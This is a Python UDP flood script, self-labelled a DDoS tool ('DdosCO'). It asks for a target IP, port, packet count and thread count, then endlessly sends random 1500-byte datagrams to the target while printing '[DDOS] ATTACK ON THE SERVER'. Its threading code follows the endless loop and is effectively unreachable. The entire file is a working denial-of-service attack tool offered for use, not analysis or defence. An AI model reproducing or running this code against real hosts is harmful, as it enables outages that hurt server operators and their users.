import pyfiglet
###################
## UDP BY DEVCO.OP ##
###################
import os, random, sys, socket, ipaddress
import random
import sys
import socket
import threading
import ipaddress
###############################
###############################

os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip_run, port_run, times_run, threads_run):
    data_run = random._urandom(1024)

    try:
        while True:
################################
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))

            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()

    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
        sys.exit(0)

    except Exception as e:
        sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")
os.system("pyfiglet =-------=")
os.system("pyfiglet   DdosCO    BC\n")
os.system("pyfiglet =-------=")


def bc():
    print("")

    while True:
        try:
            target = str(input("IP: "))
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("IP: ")
        except KeyboardInterrupt:
            ##############
            sys.exit(0)
            
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(f"IP {ip}")
        except socket.error as e:
            os.system("pyfiglet ERROR")
            print("INVALID IP")
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("PORT: "))
            break
        except ValueError:
            os.system("pyfiglet ERROR")
            print("PORT IS INVALID")
        except KeyboardInterrupt:
#########################
            sys.exit(0)

    while True:
        try:
            times_input = input("PACKETS: ")
            if times_input.strip():  
                
                times = int(times_input)
                break
            
            else:
                os.system("pyfiglet ERROR")
        except ValueError:
            os.system("pyfiglet ERROR")
        except KeyboardInterrupt:
            os.system("pyfiglet ERROR")
            sys.exit(0)

    while True:
        try:
            threads_input = input("NUMBER: ")
            if threads_input.strip():
                
                threads = int(threads_input)
                break
            else:
                os.system("pyfiglet ERROR")
        except ValueError:
            os.system("pyfiglet ERROR")
        except KeyboardInterrupt:
            os.system("pyfiglet ERROR")
            sys.exit(0)

    
    data = random._urandom(1500)
    i = random.choice(("\033[1;31m[BC]\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m[#]\033[0m"))
    error_occurred = False
    
    try:
        while True:
            print("[DDOS] ATTACK ON THE SERVER")
            print("[DDOS] ATTACK ON THE SERVER")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            s.close()

    except KeyboardInterrupt:
        print("")
        sys.exit(0)

    except Exception as e:
        if not error_occurred:
            error_occurred = True
            sys.exit("")
                
    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads))
        th.start()

if __name__ == "__main__":
    bc()
